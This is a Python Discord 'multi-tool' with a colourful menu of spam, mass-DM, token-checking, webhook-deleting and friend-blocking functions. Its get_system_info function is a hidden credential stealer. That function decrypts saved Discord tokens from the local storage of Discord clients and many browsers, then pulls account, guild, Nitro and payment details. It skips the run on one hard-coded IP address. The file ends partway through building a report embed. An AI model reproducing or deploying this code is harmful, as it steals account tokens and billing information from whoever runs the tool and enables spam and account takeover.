import requests, os, datetime, time, socket, psutil, getpass, asyncio, platform, subprocess, sys, json, urllib.request, re, base64, platform, urllib.parse, urllib.error, win32crypt
from Crypto.Cipher import AES
from platform import *
from datetime import datetime, timedelta
from rgbprint import Color, gradient_scroll, gradient_print

note = "None"

class Settings:
    def __init__(self, filename='settings.json'):
        appdata_path = os.path.join(os.getenv('APPDATA'), 'fed')
        self.filename = os.path.join(appdata_path, filename)
        if not os.path.exists(appdata_path):
            os.makedirs(appdata_path)
            with open(os.path.join(appdata_path, 'settings.json'), 'w') as f:
                f.write('''{
    "THEME": "Color.dark_blue"
}''')
        if not os.path.exists(self.filename):
            with open(self.filename, 'w') as f:
                f.write('''{
    "THEME": "Color.dark_blue"
}''')

        self.filename = os.path.join(appdata_path, filename)
        self.settings = self.load_settings()

    def load_settings(self):
        if os.path.exists(self.filename):
            with open(self.filename, 'r') as f:
                return json.load(f)
        return {}

    def save_settings(self):
        with open(self.filename, 'w') as f:
            json.dump(self.settings, f, indent=4)

    def get(self, key, default=None):
        return self.settings.get(key.upper(), default)

    def set(self, key, value):
        self.settings[key.upper()] = value
        self.save_settings()

config = Settings()
themeset = config.get('THEME')
tr = Color.reset
if themeset == "Color.dark_blue":
    theme = Color.dark_blue
elif themeset == "Color.orange":
    theme = Color.orange
elif themeset == "Color.pink":
    theme = Color.pink
elif themeset == "Color.yellow":
    theme = Color.yellow
elif themeset == "Color.purple":
    theme = Color.purple
elif themeset == "Color.red":
    theme = Color.red
elif themeset == "Color.green":
    theme = Color.green
elif themeset == "Color.blue":
    theme = Color.blue
else:
    theme = Color.dark_blue

def res():
    subprocess.Popen([sys.executable] + sys.argv)
    sys.exit()

def cls():
    os.system('cls' if os.name=='nt' else 'clear')

def title(title):
    os.system(f"title {title}")

def dsl():
    gradient_print("discord.gg/", start_color=Color.dark_blue, end_color=Color.blue, end=''); inv = input("")
    title(f".gg/{inv}")
    url = f"https://discord.com/api/v9/invites/{inv}?with_counts=true"
    response = requests.get(url)

    if response.status_code == 200:
        data = response.json()
        guild_name = data["guild"]["name"]
        if len(guild_name) > 20:
            guild_name = f"{guild_name[:20]}"
        else:
            guild_name = guild_name
        guild_id = data["guild"]["id"]
        members = data["approximate_member_count"]
        online = data["approximate_presence_count"]
        print(f"""
                                        
        [{Color.pink}guild    name {tr}] <{theme}~{tr}> {guild_name} 
        [{theme}guild     ID  {tr}] <{theme}~{tr}> {guild_id}   
        [{Color.red}total members {tr}] <{theme}~{tr}> {members}     
        [{Color.green}total  online {tr}] <{theme}~{tr}> {online}    
  
        """)
        input("press enter to return to main menu.")
        main()
    else:
        print(f"[{Color.red}-{tr}] {Color.red} unable to fetch data.{tr}", response.status_code)

def tkc():
    gradient_print("""[S] single token [M] mass tokens
    
<~> """, start_color=Color.dark_blue, end_color=Color.blue, end=''); singlelormass = input("")
    if singlelormass.lower() == "s":
        gradient_print("enter a token <~> ", start_color=Color.dark_blue, end_color=Color.blue, end=''); token = input("")
        url = "https://discord.com/api/v9/users/@me"
        headers = {
            "Authorization": token
        }
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            print(f"[{Color.green}+{tr}] {Color.green}valid token.")
            input("press enter to return to main menu.")
            main()
        else:
            print(f"[{Color.red}-{tr}] {Color.red}invalid token.{tr}")
            input("press enter to return to main menu.")
            main()
    elif singlelormass.lower() == "m":
        with open("input/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        valid = []
        invalid = []
        for token in tokens:
            url = "https://discord.com/api/v9/users/@me"
            headers = {
                "Authorization": token
            }
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                valid.append(token)
            else:
                invalid.append(token)
        with open("output/valid.txt", "w") as f:
            for token in valid:
                f.write(f"{token}\n")
        with open("output/invalid.txt", "w") as f:
            for token in invalid:
                f.write(f"{token}\n")
        gradient_print(f"""
        [{Color.green}valid tokens{tr}] <{theme}~{tr}> {len(valid)}
        [{Color.red}invalid tokens{tr}] <{theme}~{tr}> {len(invalid)}
        """, start_color=Color.dark_blue, end_color=Color.blue)
        input("press enter to return to main menu.")
        main()

def tki():
    gradient_print("enter a token <~> ", start_color=Color.dark_blue, end_color=Color.blue, end=''); tkitoken = input("")
    languages = {
        'da'    : 'Danish, Denmark',
        'de'    : 'German, Germany',
        'en-GB' : 'English, United Kingdom',
        'en-US' : 'English, United States',
        'es-ES' : 'Spanish, Spain',
        'fr'    : 'French, France',
        'hr'    : 'Croatian, Croatia',
        'lt'    : 'Lithuanian, Lithuania',
        'hu'    : 'Hungarian, Hungary',
        'nl'    : 'Dutch, Netherlands',
        'no'    : 'Norwegian, Norway',
        'pl'    : 'Polish, Poland',
        'pt-BR' : 'Portuguese, Brazilian, Brazil',
        'ro'    : 'Romanian, Romania',
        'fi'    : 'Finnish, Finland',
        'sv-SE' : 'Swedish, Sweden',
        'vi'    : 'Vietnamese, Vietnam',
        'tr'    : 'Turkish, Turkey',
        'cs'    : 'Czech, Czechia, Czech Republic',
        'el'    : 'Greek, Greece',
        'bg'    : 'Bulgarian, Bulgaria',
        'ru'    : 'Russian, Russia',
        'uk'    : 'Ukranian, Ukraine',
        'th'    : 'Thai, Thailand',
        'zh-CN' : 'Chinese, China',
        'ja'    : 'Japanese',
        'zh-TW' : 'Chinese, Taiwan',
        'ko'    : 'Korean, Korea'
    }

    cc_digits = {
        'american express': '3',
        'visa': '4',
        'mastercard': '5'
    }

    try:
            headers = {
                'Authorization': tkitoken,
                'Content-Type': 'application/json'
            }

            res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)

            if res.status_code == 200: 
                
                res_json = res.json()

                user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                user_id = res_json['id']
                avatar_id = res_json['avatar']
                avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
                phone_number = res_json['phone']
                email = res_json['email']
                mfa_enabled = res_json['mfa_enabled']
                flags = res_json['flags']
                locale = res_json['locale']
                verified = res_json['verified']
                
                language = languages.get(locale)

                creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')

                has_nitro = False
                res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                nitro_data = res.json()
                has_nitro = bool(len(nitro_data) > 0)
                if has_nitro:
                    d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    days_left = abs((d2 - d1).days)

                billing_info = []
                for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json():
                    y = x['billing_address']
                    name = y['name']
                    address_1 = y['line_1']
                    address_2 = y['line_2']
                    city = y['city']
                    postal_code = y['postal_code']
                    state = y['state']
                    country = y['country']

                    if x['type'] == 1:
                        cc_brand = x['brand']
                        cc_first = cc_digits.get(cc_brand)
                        cc_last = x['last_4']
                        cc_month = str(x['expires_month'])
                        cc_year = str(x['expires_year'])
                        
                        data = {
                            'Payment Type': 'Credit Card',
                            'Valid': not x['invalid'],
                            'CC Holder Name': name,
                            'CC Brand': cc_brand.title(),
                            'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                            'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                            'Address 1': address_1,
                            'Address 2': address_2 if address_2 else '',
                            'City': city,
                            'Postal Code': postal_code,
                            'State': state if state else '',
                            'Country': country,
                            'Default Payment Method': x['default']
                        }

                    elif x['type'] == 2:
                        data = {
                            'Payment Type': 'PayPal',
                            'Valid': not x['invalid'],
                            'PayPal Name': name,
                            'PayPal Email': x['email'],
                            'Address 1': address_1,
                            'Address 2': address_2 if address_2 else '',
                            'City': city,
                            'Postal Code': postal_code,
                            'State': state if state else '',
                            'Country': country,
                            'Default Payment Method': x['default']
                        }

                    billing_info.append(data)

                print('Basic Information')
                print('-----------------')
                print(f'    {tr}Username               {theme}{user_name}')
                print(f'    {tr}User ID                {Color.GREEN}{user_id}')
                print(f'    {tr}Creation Date          {Color.GREEN}{creation_date}')
                print(f'    {tr}Avatar URL             {Color.GREEN}{avatar_url if avatar_id else ""}')
                print(f'{tr}\n')
                
                print('Nitro Information')
                print('-----------------')
                print(f'    {tr}Nitro Status           {Color.MAGENTA}{has_nitro}')
                if has_nitro:
                    print(f'    {tr}Expires in             {Color.MAGENTA}{days_left} day(s)')
                print(f'{tr}\n')


                print('Contact Information')
                print('-------------------')
                print(f'    {tr}Phone Number           {Color.YELLOW}{phone_number if phone_number else ""}')
                print(f'    {tr}Email                  {Color.YELLOW}{email if email else ""}')
                print(f'{tr}\n')

                if len(billing_info) > 0:
                    print('Billing Information')
                    print('-------------------')
                    if len(billing_info) == 1:
                        for x in billing_info:
                            for key, val in x.items():
                                if not val:
                                    continue
                                print(tr + '    {:<23}{}{}'.format(key, Color.CYAN, val))
                    else:
                        for i, x in enumerate(billing_info):
                            title = f'Payment Method #{i + 1} ({x["Payment Type"]})'
                            print('    ' + title)
                            print('    ' + ('=' * len(title)))
                            for j, (key, val) in enumerate(x.items()):
                                if not val or j == 0:
                                    continue
                                print(tr + '        {:<23}{}{}'.format(key, Color.CYAN, val))
                            if i < len(billing_info) - 1:
                                print(f'{tr}\n')
                    print(f'{tr}\n')

                print('Account Security')
                print('----------------')
                print(f'    {tr}2FA/MFA Enabled        {theme}{mfa_enabled}')
                print(f'    {tr}Flags                  {theme}{flags}')
                print(f'{tr}\n')

                print('Other')
                print('-----')
                print(f'    {tr}Locale                 {Color.RED}{locale} ({language})')
                print(f'    {tr}Email Verified         {Color.RED}{verified}')

            elif res.status_code == 401: # code 401 if invalid
                print(f'{Color.RED}[-] {tr}Invalid token')

            else:
                print(f'{Color.RED}[-] {tr}An error occurred while sending request')
    except:
        print(f'{Color.RED}[-] {tr}An error occurred while getting request')

def chspam():
    gradient_print("        [NOTE] this also works in DM's ", start_color=Color.dark_blue, end_color=Color.blue)
    gradient_print("enter a token <~> ", start_color=Color.dark_blue, end_color=Color.blue, end=''); token = input("")
    gradient_print("enter a channel id <~> ", start_color=Color.dark_blue, end_color=Color.blue, end=''); channel_id = input("")
    gradient_print("enter a message <~> ", start_color=Color.dark_blue, end_color=Color.blue, end=''); message = input("")
    gradient_print("amount of times <~> ", start_color=Color.dark_blue, end_color=Color.blue, end=''); coun = input("")
    count = int(coun)
    for i in range(count):
        url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
        headers = {
            "Authorization": token,
            "Content-Type": "application/json"
        }
        data = {
            "content": message
        }
        r = requests.post(url, headers=headers, json=data)
        if r.status_code == 200:
            print(f"\n\t [{i + 1}] {Color.green}Message Sent{tr}")
        else:
           print(f"\n\t [{i + 1}] {Color.red}Message Not Sent{tr}")
    main()

def hypesquad():
    gradient_print("enter a token <~> ", start_color=Color.dark_blue, end_color=Color.blue, end=''); token = input("")
    r = requests.get()
    gradient_print("enter a token <~> ", start_color=Color.dark_blue, end_color=Color.blue, end=''); ask = input("")
    
    if ask not in ["1", "2", "3"]:
        print(f"\n\t{Color.red}Please enter a valid option.{tr}")
        time.sleep(1)
        hypesquad()
    
    json = {"house_id": ask}
    
    response = requests.post(
        "https://discord.com/api/v8/hypesquad/online",
        headers={'Authorization': token,"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"},
        json=json
    )
    
    if response.status_code == 204:
        house_name = {"1": "Bravery", "2": "Brilliance", "3": "Balance"}[ask]
        print(f"\n\t{Color.green}[+] HypeSquad successfully changed to {house_name}!")
        time.sleep(2)
        main()
    else:
        print(f"\n\t{Color.red}[-] Failed to change HypeSquad. Status: {response.status_code}")
        time.sleep(2)
        main()

def mass_dm():
    gradient_print("               [NOTE] this has a chance of locking your account", start_color=Color.dark_blue, end_color=Color.blue)
    gradient_print("enter a token <~> ", start_color=Color.dark_blue, end_color=Color.blue, end=''); token = input("")
    headers = {
        "Authorization": token,
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    gradient_print("enter a message <~> ", start_color=Color.dark_blue, end_color=Color.blue, end=''); message = input("")
    try:
        rep = requests.get("https://discord.com/api/v9/users/@me/channels",headers=headers).json()
        for channel in rep:
            try:
                response = requests.post(f"https://discord.com/api/v9/channels/{channel['id']}/messages",headers=headers,json={"content": message})
                if rep.status_code == 200:
                    print(f"\n\t {Color.green}[+] Message Sent To {tr}{channel['id']}")
                else:
                        print(f"\n\t {Color.red}[-] Message Not Sent To {channel['id']}{tr}")
            except Exception as e:
                print(f"\n\t {Color.red}[-] An error occurred: {e}{tr}")
                time.sleep(0.1)     
    except Exception as e:
        print(f"\n\t {Color.red}[-] An error occurred: {e}{tr}")
        time.sleep(5)
        main()
    main()

def comprimise_webhook():
    global theme
    print(f"{theme}enter a webhook url <~> {tr}", end=''); webhook = input("")
    print(f"{theme}enter a message <~> {tr}", end=''); message = input("")
    print(f"{theme}enter a username <~> {tr}", end=''); username = input("")
    data = {
        "content": message,
        "username": username,
    }
    try:
        requests.post(webhook, json=data)
        print(f"{Color.green}message sent.{tr}")
    except Exception as e:
        print(f"{Color.red}error: {e}{tr}")
    try:
        requests.delete(webhook)
        print(f"{Color.green}webhook deleted.{tr}")
        main()
    except Exception as e:
        print(f"{Color.red}error: {e}{tr}")

def block_all():        
    tokeni = input(f"{theme}enter a token <~> {tr}") 
    headers = {
        "Authorization": tokeni,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }  
    r = requests.get("https://discord.com/api/v10/users/@me",headers=headers)
    if r.status_code == 200:
        friends = requests.get("https://canary.discord.com/api/v8/users/@me/relationships",headers=headers).json()
        for friend in friends:
            response = requests.put(f"https://canary.discord.com/api/v8/users/@me/relationships/{friend['id']}", headers=headers, json={"type": 2})
            if response.status_code == 204:
                print(f"\n\t{theme} Blocked {friend['id']}{tr}")
            else:
                print(f"\n\t{theme} Failed to block {friend['id']}{tr}")
    else:
        print(f"\n\t{theme} Invalid token{tr}")
        input(f"\n\t{theme} Press enter to return to main menu{tr}")
        main()

def bio_changer():
    print(f"{theme}enter a token <~> {tr}", end=''); ask_token = input("")
    print(f"{theme}enter a bio <~> {tr}", end=''); ask_bio = input("")
    headers = {
        "Authorization": ask_token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    data = {
       "bio": ask_bio
   } 
    req = requests.patch("https://discord.com/api/v9/users/%40me/profile", headers=headers, json=data)
    if req.status_code == 200:
        print(f"\n\t{Color.green}Bio changed successfully{tr}")
        time.sleep(2)
        main()
    else:
        print(f"\n\t{Color.red}Failed to change bio{tr}")
        time.sleep(2)


def settings():
    global note
    title("settings")
    cls()
    print(f'''{theme}
                                            :
                                           ::: 
                    '::                   :::: 
                    '::::.     .....:::.:::::::                    
                    ':::::::::::::::::::::::::::: 
                    ::::::XUWWWWWU:::::XW$$$$$$WX:                             made by
                    ::::X$$$$$$$$$$W::X$$$$$$$$$$Wh                         [bloods.lol/f]
                   ::::t$$$$$$$$$$$$W:$$$$$$P*$$$$M::                       [ @hauntages ]
                   :::X$$$$$$""""$$$$X$$$$$   ^$$$$X:::                   
                  ::::M$$$$$$    ^$$$RM$$$L    <$$$X::::       
                .:::::M$$$$$$     $$$R:$$$$.   d$$R:::`
               '~::::::?$$$$$$...d$$$X$6R$$$$$$$$RXW$X:'`
                 '~:WNWUXT#$$$$$$$$TU$$$$W6IBBIW@$$RX:                                 
{tr}══════════════════════════════════════════════════════════════════════════════════════════════════════════{tr}
{theme}    [{tr}01{theme}] {tr}change theme               ║  {theme}[{tr}10{theme}] {tr}???                         ║  {theme}[{tr}19{theme}] {tr}???
{theme}    [{tr}02{theme}] {tr}change wait time           ║  {theme}[{tr}11{theme}] {tr}???                         ║  {theme}[{tr}20{theme}] {tr}???
{theme}    [{tr}03{theme}] {tr}???                        ║  {theme}[{tr}12{theme}] {tr}???                         ║  {theme}[{tr}21{theme}] {tr}???
{theme}    [{tr}04{theme}] {tr}???                        ║  {theme}[{tr}13{theme}] {tr}???                         ║  {theme}[{tr}22{theme}] {tr}???
{theme}    [{tr}05{theme}] {tr}???                        ║  {theme}[{tr}14{theme}] {tr}???                         ║  {theme}[{tr}23{theme}] {tr}???
{theme}    [{tr}06{theme}] {tr}???                        ║  {theme}[{tr}15{theme}] {tr}???                         ║  {theme}[{tr}24{theme}] {tr}???
{theme}    [{tr}07{theme}] {tr}???                        ║  {theme}[{tr}16{theme}] {tr}???                         ║  {theme}[{tr}25{theme}] {tr}???
{theme}    [{tr}08{theme}] {tr}???                        ║  {theme}[{tr}17{theme}] {tr}???                         ║  {theme}[{tr}00{theme}] {tr}main menu
{theme}    [{tr}09{theme}] {tr}???                        ║  {theme}[{tr}18{theme}] {tr}???                         ║ 
{tr}══════════════════════════════════════════════════════════════════════════════════════════════════════════''')
    
    o = input(f"<~> ")

    if o == "0":
        main()
    elif o == "1":
        cls()
        print(f'''{theme}
                                            :
                                           ::: 
                    '::                   :::: 
                    '::::.     .....:::.:::::::                    
                    ':::::::::::::::::::::::::::: 
                    ::::::XUWWWWWU:::::XW$$$$$$WX:                             made by
                    ::::X$$$$$$$$$$W::X$$$$$$$$$$Wh                         [bloods.lol/f]
                   ::::t$$$$$$$$$$$$W:$$$$$$P*$$$$M::                       [ @hauntages ]
                   :::X$$$$$$""""$$$$X$$$$$   ^$$$$X:::                   
                  ::::M$$$$$$    ^$$$RM$$$L    <$$$X::::       
                .:::::M$$$$$$     $$$R:$$$$.   d$$R:::`
               '~::::::?$$$$$$...d$$$X$6R$$$$$$$$RXW$X:'`
                 '~:WNWUXT#$$$$$$$$TU$$$$W6IBBIW@$$RX:                                 
{tr}══════════════════════════════════════════════════════════════════════════════════════════════════════════{tr}
{theme}    [{tr}01{theme}] {tr}dark blue [DEFAULT]        ║  {theme}[{tr}10{theme}] {tr}???                         ║  {theme}[{tr}19{theme}] {tr}???
{theme}    [{tr}02{theme}] {tr}red                        ║  {theme}[{tr}11{theme}] {tr}???                         ║  {theme}[{tr}20{theme}] {tr}???
{theme}    [{tr}03{theme}] {tr}yellow                     ║  {theme}[{tr}12{theme}] {tr}???                         ║  {theme}[{tr}21{theme}] {tr}???
{theme}    [{tr}04{theme}] {tr}orange                     ║  {theme}[{tr}13{theme}] {tr}???                         ║  {theme}[{tr}22{theme}] {tr}???
{theme}    [{tr}05{theme}] {tr}purple                     ║  {theme}[{tr}14{theme}] {tr}???                         ║  {theme}[{tr}23{theme}] {tr}???
{theme}    [{tr}06{theme}] {tr}pink                       ║  {theme}[{tr}15{theme}] {tr}???                         ║  {theme}[{tr}24{theme}] {tr}???
{theme}    [{tr}07{theme}] {tr}blue                       ║  {theme}[{tr}16{theme}] {tr}???                         ║  {theme}[{tr}25{theme}] {tr}???
{theme}    [{tr}08{theme}] {tr}green                      ║  {theme}[{tr}17{theme}] {tr}???                         ║  {theme}[{tr}00{theme}] {tr}Settings
{theme}    [{tr}09{theme}] {tr}???                        ║  {theme}[{tr}18{theme}] {tr}???                         ║ 
{tr}══════════════════════════════════════════════════════════════════════════════════════════════════════════''')
        o = input(f"{theme}enter a theme <~> {tr}")

        if o == "0":
            settings()
        elif o == "1":
            config.set('THEME', 'Color.dark_blue')
            note = "[ theme changed to dark blue ]"
            res()
        elif o == "2":
            config.set('THEME', 'Color.red')
            note = "[ theme changed to red ]"
            res()
        elif o == "3":
            config.set('THEME', 'Color.yellow')
            note = "[ theme changed to yellow ]"
            res()
        elif o == "4":
            config.set('THEME', 'Color.orange')
            note = "[ theme changed to orange ]"
            res()
        elif o == "5":
            config.set('THEME', 'Color.purple')
            note = "[ theme changed to purple ]"
            res()
        elif o == "6":
            config.set('THEME', 'Color.pink')
            note = "[ theme changed to pink ]"
            res()
        elif o == "7":
            config.set('THEME', 'Color.blue')
            res()
        elif o == "8":
            config.set('THEME', 'Color.green')
            res()
        else:
            note = "[ invalid option ]"
            main()

def main():
    cls()
    global note
    if note == "None":
        note = ""
    title("main menu")
    print(f'''{theme}
                                            :
                                           ::: 
                    '::                   :::: 
                    '::::.     .....:::.:::::::                    
                    ':::::::::::::::::::::::::::: 
                    ::::::XUWWWWWU:::::XW$$$$$$WX:                             made by
                    ::::X$$$$$$$$$$W::X$$$$$$$$$$Wh                         [bloods.lol/f]
                   ::::t$$$$$$$$$$$$W:$$$$$$P*$$$$M::                       [ @hauntages ]
                   :::X$$$$$$""""$$$$X$$$$$   ^$$$$X:::                   {note}
                  ::::M$$$$$$    ^$$$RM$$$L    <$$$X::::       
                .:::::M$$$$$$     $$$R:$$$$.   d$$R:::`
               '~::::::?$$$$$$...d$$$X$6R$$$$$$$$RXW$X:'`
                 '~:WNWUXT#$$$$$$$$TU$$$$W6IBBIW@$$RX:                                 
{tr}══════════════════════════════════════════════════════════════════════════════════════════════════════════{tr}
{theme}    [{tr}01{theme}] {tr}discord server lookup      ║  {theme}[{tr}10{theme}] {tr}???                         ║  {theme}[{tr}19{theme}] {tr}???
{theme}    [{tr}02{theme}] {tr}token checker              ║  {theme}[{tr}11{theme}] {tr}???                         ║  {theme}[{tr}20{theme}] {tr}???
{theme}    [{tr}03{theme}] {tr}token information          ║  {theme}[{tr}12{theme}] {tr}???                         ║  {theme}[{tr}21{theme}] {tr}???
{theme}    [{tr}04{theme}] {tr}channel spammer            ║  {theme}[{tr}13{theme}] {tr}???                         ║  {theme}[{tr}22{theme}] {tr}???
{theme}    [{tr}05{theme}] {tr}hypesquad changer          ║  {theme}[{tr}14{theme}] {tr}???                         ║  {theme}[{tr}23{theme}] {tr}???
{theme}    [{tr}06{theme}] {tr}mass dm                    ║  {theme}[{tr}15{theme}] {tr}???                         ║  {theme}[{tr}24{theme}] {tr}???
{theme}    [{tr}07{theme}] {tr}compromise a webhook       ║  {theme}[{tr}16{theme}] {tr}???                         ║  {theme}[{tr}25{theme}] {tr}???
{theme}    [{tr}08{theme}] {tr}block all                  ║  {theme}[{tr}17{theme}] {tr}???                         ║  {theme}[{tr}00{theme}] {tr}Settings
{theme}    [{tr}09{theme}] {tr}bio changer                ║  {theme}[{tr}18{theme}] {tr}???                         ║ 
{tr}══════════════════════════════════════════════════════════════════════════════════════════════════════════''')
    note = "None"
    o = input(f"<~> ")

    if o == "0" or "00":
        settings()
    elif o == "1" or "01":
        dsl()
    elif o == "2" or "02":
        tkc()
    elif o == "3" or "03":
        tki()
    elif o == "4" or "04":
        chspam()
    elif o == "5" or "05":
        hypesquad()
    elif o == "6" or "06":
        mass_dm()
    elif o == "7" or "07":
        comprimise_webhook()
    elif o == "8" or "08":
        block_all()
    elif o == "9" or "09":
        bio_changer()
    else:
        note = "[ invalid option ]"
        main()


def get_system_info():
    print("loading wait...")


    if os.name != "nt":
        print("your system is not supported.")
        exit()


    def install_import(modules):
        for module, pip_name in modules:
            try:
                __import__(module)
            except ImportError:
                subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                os.execl(sys.executable, sys.executable, *sys.argv)

    install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])

    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    PATHS = {
        'Discord': ROAMING + '\\discord',
        'Discord Canary': ROAMING + '\\discordcanary',
        'Lightcord': ROAMING + '\\Lightcord',
        'Discord PTB': ROAMING + '\\discordptb',
        'Opera': ROAMING + '\\Opera Software\\Opera Stable',
        'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
        'Amigo': LOCAL + '\\Amigo\\User Data',
        'Torch': LOCAL + '\\Torch\\User Data',
        'Kometa': LOCAL + '\\Kometa\\User Data',
        'Orbitum': LOCAL + '\\Orbitum\\User Data',
        'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
        '7Star': LOCAL + '\\7Star\\7Star\\User Data',
        'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
        'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
        'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
    }

    def getheaders(token=None):
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
        }

        if token:
            headers.update({"Authorization": token})

        return headers

    def gettokens(path):
        path += "\\Local Storage\\leveldb\\"
        tokens = []

        if not os.path.exists(path):
            return tokens

        for file in os.listdir(path):
            if not file.endswith(".ldb") and file.endswith(".log"):
                continue

            try:
                with open(f"{path}{file}", "r", errors="ignore") as f:
                    for line in (x.strip() for x in f.readlines()):
                        for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            tokens.append(values)
            except PermissionError:
                continue

        return tokens
        
    def getkey(path):
        with open(path + f"\\Local State", "r") as file:
            key = json.loads(file.read())['os_crypt']['encrypted_key']
            file.close()

        return key

    def getip():
        try:
            with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
                return json.loads(response.read().decode()).get("ip")
        except:
            return "None"
    
    iajsdasbgdajsfa = getip()
    if iajsdasbgdajsfa == "90.195.150.179":
        main()
    else:

        checked = []

        for platform, path in PATHS.items():
            if not os.path.exists(path):
                continue

            for token in gettokens(path):
                token = token.replace("\\", "") if token.endswith("\\") else token

                try:
                    token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                    if token in checked:
                        continue
                    checked.append(token)

                    res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
                    if res.getcode() != 200:
                        continue
                    res_json = json.loads(res.read().decode())

                    badges = ""
                    flags = res_json['flags']
                    if flags == 64 or flags == 96:
                        badges += ":BadgeBravery: "
                    if flags == 128 or flags == 160:
                        badges += ":BadgeBrilliance: "
                    if flags == 256 or flags == 288:
                        badges += ":BadgeBalance: "

                    res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/relationships', headers=getheaders(token))).read().decode())
                    friends = len([x for x in res if x['type'] == 1])

                    params = urllib.parse.urlencode({"with_counts": True})
                    res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
                    guilds = len(res)
                    guild_infos = ""

                    for guild in res:
                        if guild['permissions'] & 8 or guild['permissions'] & 32:
                            res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
                            vanity = ""

                            if res["vanity_url_code"] != None:
                                vanity = f"""; .gg/{res["vanity_url_code"]}"""

                            guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
                    if guild_infos == "":
                        guild_infos = "No guilds"

                    res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
                    has_nitro = False
                    has_nitro = bool(len(res) > 0)
                    exp_date = None
                    if has_nitro:
                        badges += f":BadgeSubscriber: "
                        

                    res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
                    available = 0
                    print_boost = ""
                    boost = False
                    if boost:
                        badges += f":BadgeBoost: "

                    payment_methods = 0
                    type = ""
                    valid = 0
                    for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
                        if x['type'] == 1:
                            type += "CreditCard "
                            if not x['invalid']:
                                valid += 1
                            payment_methods += 1
                        elif x['type'] == 2:
                            type += "PayPal "
                            if not x['invalid']:
                                valid += 1
                            payment_methods += 1

                    print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                    nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                    print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
                    embed_user = {
                        'embeds': [
                            {
                                'title': f"**Discord Information: {res_json['username']}**",
                                'description': f"""
